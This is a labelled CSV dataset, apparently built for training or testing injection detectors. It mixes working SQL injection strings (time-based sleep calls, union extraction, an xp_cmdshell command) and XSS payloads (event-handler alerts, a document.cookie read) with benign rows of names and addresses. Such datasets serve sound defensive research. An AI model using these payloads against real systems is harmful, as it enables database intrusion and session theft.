index,payload,type
533,t'exec master..xp_cmdshell 'nslookup www.google.com'--,sqli
18009,<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,xss
2215,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",sqli
424," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",sqli
13811,44392621e,benign
1497,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sqli
13757,"guardia, la",benign
16684,"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",xss
1431,1'  )   as upgb where 2031  =  2031,sqli
19855,<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,xss
20265,"<tt onmouseover=""alert(1)"">test</tt>",xss
19694,"<svg onkeyup=""alert(1)"" contenteditable>test</svg>",xss
19298,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",xss
2110,1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',sqli
1411,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sqli
12451,"vallbona, 72 3?b",benign
16533,"<del onclick=""alert(1)"">test</del>",xss
16138,"<canvas draggable=""true"" ondragstart=""alert(1)"">test</canvas>",xss
1031,"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",sqli
14687,fariba,benign
15101,98810075m,benign
17192,<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>,xss
14469,12785855v,benign
1962,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",sqli
13214,7964,benign
12416,6.04E+15,benign
12781,"calle hernandez iglesias, 160,",benign
12617,gambs galatioto,benign
14057,rosselot azcona,benign
18957,"<style>:target {transform: rotate(180deg);}</style><p id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></p>",xss
17612,"<i draggable=""true"" ondragenter=""alert(1)"">test</i>",xss
17344,"<form onmouseover=""alert(1)"">test</form>",xss
13909,amn,benign
2081,"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ",sqli
1635," end and ""xouo"" like ""xouo",sqli
15331,<x onmouseover=alert(1)>hover this! ,xss
2534,1'+  (  select 'mxlb' where 4900  =  4900,sqli
11442,olaya,benign
19910,"<tbody onmouseup=""alert(1)"">test</tbody>",xss
18788,"<style>:target {color:red;}</style><isindex id=x style=""transition:color 1s"" ontransitionend=alert(1)></isindex>",xss
13644,fasti-dio,benign
11840,44338,benign
14226,81e9604o6o,benign
14240,inofensiva,benign
16778,"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",xss
15695,"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss
19244,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></picture>",xss
14942,1.71E+15,benign
11826,"c/ san guillermo, 182",benign
20147,<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,xss
14393,spruance@maquillajeparalabios.ro,benign
1741,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',sqli
17290,<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,xss
12203,yecla,benign
3793,"1%'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
1564,"1""  )   where 9447  =  9447",sqli
16871,"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",xss
13704,enris6rar,benign
12694,ornella,benign
20520,<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,xss
15195,vazkn,benign
1695,1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',sqli
13111,guadiana 149 6f,benign
2888,"1'  )   as wnyl where 8978  =  8978 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
15670,<aside id=x tabindex=1 onfocus=alert(1)></aside>,xss
1244,"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",sqli
15903,<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,xss
13969,5631,benign
20669,"<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z",xss
16260,"<cite onmouseup=""alert(1)"">test</cite>",xss
3731,"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""gvlc"" like ""gvlc",sqli
13033,2.11E+15,benign
13585,pipponzi,benign
14587,huesca,benign
3607,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sqli
1408,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo",sqli
13541,kwokchoi,benign
2421,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",sqli
11396,6.66E+15,benign
19676,<svg id=x onfocus=alert(1)>,xss
